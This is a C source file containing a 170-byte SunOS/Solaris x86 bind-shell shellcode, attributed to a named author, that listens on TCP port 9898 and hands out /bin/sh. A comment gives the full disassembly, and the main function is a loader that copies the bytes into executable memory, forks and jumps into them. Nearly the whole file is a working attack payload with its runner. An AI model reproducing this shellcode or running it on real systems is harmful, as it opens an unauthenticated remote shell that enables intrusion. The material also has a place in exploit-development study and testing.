#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#if (defined __sun || defined __FreeBSD__)
#include <strings.h>
#endif

#include <sys/mman.h>
#include <sys/types.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <unistd.h>

#include "compiler/compiler.h"
#include "regs/stack.h"
#include "regs/state.h"

/*
 * SunOS (Solaris) / x86 (port bind / bindshell) TCP:9898 170 bytes shellcode
 *
 * Paulus Gandung Prakosa <gandung@lists.infradead.org>
 *
 * Tested on: SunOS solaris-vagrant 5.11 11.4.0.15.0 i86pc i386 i86pc
 *
 * Disassembly of section .text:
 *
 * 08050428 <_start>:
 * 8050428:       33 f6                   xor    %esi,%esi
 * 805042a:       33 db                   xor    %ebx,%ebx
 * 805042c:       43                      inc    %ebx
 * 805042d:       43                      inc    %ebx
 * 805042e:       33 c9                   xor    %ecx,%ecx
 * 8050430:       41                      inc    %ecx
 * 8050431:       41                      inc    %ecx
 * 8050432:       33 d2                   xor    %edx,%edx
 * 8050434:       83 c2 06                add    $0x6,%edx
 * 8050437:       33 c0                   xor    %eax,%eax
 * 8050439:       b0 e6                   mov    $0xe6,%al
 * 805043b:       56                      push   %esi
 * 805043c:       52                      push   %edx
 * 805043d:       51                      push   %ecx
 * 805043e:       53                      push   %ebx
 * 805043f:       50                      push   %eax
 * 8050440:       cd 91                   int    $0x91
 * 8050442:       8b f8                   mov    %eax,%edi
 * 8050444:       33 d2                   xor    %edx,%edx
 * 8050446:       42                      inc    %edx
 * 8050447:       c1 e2 04                shl    $0x4,%edx
 * 805044a:       56                      push   %esi
 * 805044b:       33 c9                   xor    %ecx,%ecx
 * 805044d:       66 b9 26 aa             mov    $0xaa26,%cx
 * 8050451:       66 51                   push   %cx
 * 8050453:       33 c9                   xor    %ecx,%ecx
 * 8050455:       41                      inc    %ecx
 * 8050456:       41                      inc    %ecx
 * 8050457:       66 51                   push   %cx
 * 8050459:       8b cc                   mov    %esp,%ecx
 * 805045b:       56                      push   %esi
 * 805045c:       52                      push   %edx
 * 805045d:       51                      push   %ecx
 * 805045e:       57                      push   %edi
 * 805045f:       33 c0                   xor    %eax,%eax
 * 8050461:       b0 e8                   mov    $0xe8,%al
 * 8050463:       50                      push   %eax
 * 8050464:       cd 91                   int    $0x91
 * 8050466:       56                      push   %esi
 * 8050467:       56                      push   %esi
 * 8050468:       57                      push   %edi
 * 8050469:       33 c0                   xor    %eax,%eax
 * 805046b:       b0 e9                   mov    $0xe9,%al
 * 805046d:       50                      push   %eax
 * 805046e:       cd 91                   int    $0x91
 * 8050470:       56                      push   %esi
 * 8050471:       56                      push   %esi
 * 8050472:       56                      push   %esi
 * 8050473:       57                      push   %edi
 * 8050474:       33 c0                   xor    %eax,%eax
 * 8050476:       b0 ea                   mov    $0xea,%al
 * 8050478:       50                      push   %eax
 * 8050479:       cd 91                   int    $0x91
 * 805047b:       8b f8                   mov    %eax,%edi
 * 805047d:       56                      push   %esi
 * 805047e:       33 d2                   xor    %edx,%edx
 * 8050480:       52                      push   %edx
 * 8050481:       33 c9                   xor    %ecx,%ecx
 * 8050483:       83 c1 09                add    $0x9,%ecx
 * 8050486:       51                      push   %ecx
 * 8050487:       57                      push   %edi
 * 8050488:       33 c0                   xor    %eax,%eax
 * 805048a:       b0 3e                   mov    $0x3e,%al
 * 805048c:       50                      push   %eax
 * 805048d:       cd 91                   int    $0x91
 * 805048f:       56                      push   %esi
 * 8050490:       33 d2                   xor    %edx,%edx
 * 8050492:       42                      inc    %edx
 * 8050493:       52                      push   %edx
 * 8050494:       33 c9                   xor    %ecx,%ecx
 * 8050496:       83 c1 09                add    $0x9,%ecx
 * 8050499:       51                      push   %ecx
 * 805049a:       57                      push   %edi
 * 805049b:       33 c0                   xor    %eax,%eax
 * 805049d:       b0 3e                   mov    $0x3e,%al
 * 805049f:       50                      push   %eax
 * 80504a0:       cd 91                   int    $0x91
 * 80504a2:       56                      push   %esi
 * 80504a3:       33 d2                   xor    %edx,%edx
 * 80504a5:       42                      inc    %edx
 * 80504a6:       42                      inc    %edx
 * 80504a7:       52                      push   %edx
 * 80504a8:       33 c9                   xor    %ecx,%ecx
 * 80504aa:       83 c1 09                add    $0x9,%ecx
 * 80504ad:       51                      push   %ecx
 * 80504ae:       57                      push   %edi
 * 80504af:       33 c0                   xor    %eax,%eax
 * 80504b1:       b0 3e                   mov    $0x3e,%al
 * 80504b3:       50                      push   %eax
 * 80504b4:       cd 91                   int    $0x91
 * 80504b6:       56                      push   %esi
 * 80504b7:       68 6e 2f 73 68          push   $0x68732f6e
 * 80504bc:       68 2f 2f 62 69          push   $0x69622f2f
 * 80504c1:       8b dc                   mov    %esp,%ebx
 * 80504c3:       56                      push   %esi
 * 80504c4:       53                      push   %ebx
 * 80504c5:       8b cc                   mov    %esp,%ecx
 * 80504c7:       56                      push   %esi
 * 80504c8:       56                      push   %esi
 * 80504c9:       51                      push   %ecx
 * 80504ca:       53                      push   %ebx
 * 80504cb:       33 c0                   xor    %eax,%eax
 * 80504cd:       b0 3b                   mov    $0x3b,%al
 * 80504cf:       50                      push   %eax
 * 80504d0:       cd 91                   int    $0x91
 */

#ifndef unused
#define unused(x) ((void)(x))
#endif

#ifndef SHADOW_STACK_SIZE
#define SHADOW_STACK_SIZE (1024 * 4)
#endif

int main(int argc, char **argv) {
  unused(argc);
  unused(argv);

  int ret, wstatus;
  pid_t pid;
  struct utsname uts;
  char *pcall;
  char *thread_stack;
  char *shadow_stack;
  char *shellcode = "\x33\xf6\x33\xdb\x43\x43\x33\xc9"
                    "\x41\x41\x33\xd2\x83\xc2\x06\x33"
                    "\xc0\xb0\xe6\x56\x52\x51\x53\x50"
                    "\xcd\x91\x8b\xf8\x33\xd2\x42\xc1"
                    "\xe2\x04\x56\x33\xc9\x66\xb9\x26"
                    "\xaa\x66\x51\x33\xc9\x41\x41\x66"
                    "\x51\x8b\xcc\x56\x52\x51\x57\x33"
                    "\xc0\xb0\xe8\x50\xcd\x91\x56\x56"
                    "\x57\x33\xc0\xb0\xe9\x50\xcd\x91"
                    "\x56\x56\x56\x57\x33\xc0\xb0\xea"
                    "\x50\xcd\x91\x8b\xf8\x56\x33\xd2"
                    "\x52\x33\xc9\x83\xc1\x09\x51\x57"
                    "\x33\xc0\xb0\x3e\x50\xcd\x91\x56"
                    "\x33\xd2\x42\x52\x33\xc9\x83\xc1"
                    "\x09\x51\x57\x33\xc0\xb0\x3e\x50"
                    "\xcd\x91\x56\x33\xd2\x42\x42\x52"
                    "\x33\xc9\x83\xc1\x09\x51\x57\x33"
                    "\xc0\xb0\x3e\x50\xcd\x91\x56\x68"
                    "\x6e\x2f\x73\x68\x68\x2f\x2f\x62"
                    "\x69\x8b\xdc\x56\x53\x8b\xcc\x56"
                    "\x56\x51\x53\x33\xc0\xb0\x3b\x50"
                    "\xcd\x91";

  pcall = mmap(NULL, sysconf(_SC_PAGESIZE), PROT_WRITE | PROT_EXEC,
               MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);

  if (unlikely(pcall == MAP_FAILED)) {
    perror("mmap()");
    ret = -errno;
    goto __fallback;
  }

  shadow_stack = calloc(SHADOW_STACK_SIZE, sizeof(char));

  if (unlikely(!shadow_stack)) {
    perror("calloc()");
    ret = -errno;
    goto __must_unmap_payload;
  }

  bzero(&uts, sizeof(struct utsname));

  if ((ret = uname(&uts)) < 0) {
    perror("uname()");
    ret = -errno;
    goto __must_unmap_shadow_stack;
  }

  printf("[*] Machine info\n");
  printf(" [*] sys: %s\n", uts.sysname);
  printf(" [*] node: %s\n", uts.nodename);
  printf(" [*] release: %s\n", uts.release);
  printf(" [*] version: %s\n", uts.version);
  printf(" [*] machine: %s\n", uts.machine);

  printf("[*] Copying shellcode info crafted buffer.\n");
  memcpy(pcall, shellcode, strlen(shellcode));

  printf("[*] Saving register state..\n");
  save_regs(&__serialize_regs(cregs));

  printf("[*] Saving thread stack..\n");
  thread_stack = get_stack();

  printf("[*] Creating trivial sandbox..\n");

  pid = fork();

  if (unlikely(pid < 0)) {
    perror("fork()");
    ret = -errno;
    goto __must_restore_regs;
  }

  if (likely(!pid)) {
#ifdef THREAD_DEBUG
    printf("[*] Debug\n");
    printf(" [*] thread_stack: %p\n", thread_stack);
    printf(" [*] shadow_stack: %p\n", shadow_stack);
#endif

    printf("[*] Installing shadow stack..\n");
    set_stack(shadow_stack);

    if ((unsigned long)get_stack() != (unsigned long)shadow_stack) {
      printf("[-] Failing to install shadow stack. Fallback..\n");
      exit(1);
    }

    printf("[*] Shadow stack installed.\n");
    printf("[*] Executing the shellcode..\n");
    __asm__ __volatile__("calll *%%eax\n" : : "a"(pcall));
  } else {
    waitpid(-1, &wstatus, 0);
  }

  printf("[*] Restoring the stack..\n");
  set_stack(thread_stack);

  if ((unsigned long)get_stack() != (unsigned long)thread_stack) {
    printf("[-] Stack restoration failed. Fallback..\n");
    ret = -1;
    goto __must_restore_regs;
  }

  printf("[*] Stack restored.\n");
  printf("[*] Restoring register state..\n");
  store_regs(&__serialize_regs(cregs));

  printf("[*] Cleaning up..\n");
  free(shadow_stack);
  munmap(pcall, sysconf(_SC_PAGESIZE));

  return 0;

__must_restore_regs:
  store_regs(&__serialize_regs(cregs));

__must_unmap_shadow_stack:
  free(shadow_stack);

__must_unmap_payload:
  munmap(pcall, sysconf(_SC_PAGESIZE));

__fallback:
  return ret;
}
